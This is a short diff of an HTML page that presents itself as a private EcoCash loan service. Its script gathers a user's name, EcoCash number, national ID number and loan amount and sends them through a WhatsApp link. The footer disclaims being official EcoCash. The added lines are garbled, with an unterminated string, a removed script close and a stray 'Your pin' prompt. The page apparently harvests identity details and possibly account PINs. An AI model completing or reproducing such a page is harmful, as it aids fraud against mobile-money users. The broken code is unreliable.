@@ -39,11 +39,8 @@ var n=document.getElementById('name').value;
 var e=document.getElementById('econumber').value;
 var id=document.getElementById('idnumber').value;
 var a=document.getElementById('amount').value;
-var msg="New EcoCash Loan:%0AName: "+n+"%0AEcoCash: "+e+"%0AID Number: "+id+"%0AAmount: "+a;
-window.open("https://wa.me/263XXXXXXXX?text="+msg);
-}
-</script>
-
-<p style="margin-top:20px;font-size:11px">Private service for EcoCash users • Not official EcoCash • Official Kashagi *151*6#</p>
+var msg="New EcoCash Loan:%0AName: "+n+"%0AEcoCash: "+e+"%0AID Number: "+id+"%0AAmount: 
+>``Your pin<``
+<p style="margin-top:20px;font-size:11px">Private service for EcoCash users • Not official EcoCash • Official Kashagi 
 </body>
 </html>
